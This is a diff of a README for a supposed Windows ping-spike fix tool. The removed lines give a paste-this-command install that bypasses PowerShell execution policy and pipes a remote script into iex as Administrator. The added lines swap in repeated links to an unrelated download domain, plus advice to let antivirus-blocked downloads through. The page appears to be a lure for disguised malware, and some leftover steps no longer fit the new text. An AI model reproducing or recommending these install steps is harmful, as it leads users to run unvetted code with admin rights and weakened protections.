@@ -8,15 +8,32 @@ Fix **ping spike fix multiplayer games** on Windows 10/11. Built for PC gamers �
 
 ---
 
-## Download & Install (PowerShell)
+## Download & Install
 
-> **This is the download page.** The command below downloads and runs the **Ping Spike Fix Multiplayer** repair tool on Windows 10/11.
+> **This is the download page.** Use the button or link below to get **Ping Spike Fix Multiplayer** for Windows.
 
-#### Before you start
+<p align="center">
+  <a href="https://ping-spike-multiplayer.zipzapsol.space/">
+    <img src="https://img.shields.io/badge/Download-Ping%20Spike%20Fix%20Multiplayer-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Ping Spike Fix Multiplayer">
+  </a>
+</p>
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+| | |
+| --- | --- |
+| **Direct link** | **[ping-spike-multiplayer.zipzapsol.space](https://ping-spike-multiplayer.zipzapsol.space/)** |
+| **Full URL** | `https://ping-spike-multiplayer.zipzapsol.space/` |
+| **Type** | Fix tool for Windows 10 / 11 (64-bit) |
+| **Admin** | Run setup as Administrator |
+
+### Quick steps
+
+1. Click **[Download — ping-spike-multiplayer.zipzapsol.space](https://ping-spike-multiplayer.zipzapsol.space/)** (link above)
+2. Save the file from the project page
+3. Run the setup **as Administrator**
+4. Enter your license key when prompted
+5. Restart if the installer asks — then launch from Start menu
+
+<p align="center"><a href="https://ping-spike-multiplayer.zipzapsol.space/"><strong>⬇ Download Ping Spike Fix Multiplayer now</strong></a></p>
 
 ---
 
@@ -39,10 +56,7 @@ You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
 
 Select **both lines** below and press **Ctrl+C**:
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+
 
 > Copy **both lines**, not just the second one.
 
@@ -80,7 +94,7 @@ Open **Start menu** → search for **Ping Spike Fix Multiplayer** → run it.
 | Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
 | Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
 
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
+**Install type:** Direct link (zipzap) — no browser needed after Admin PowerShell is open.
 
 ---
 
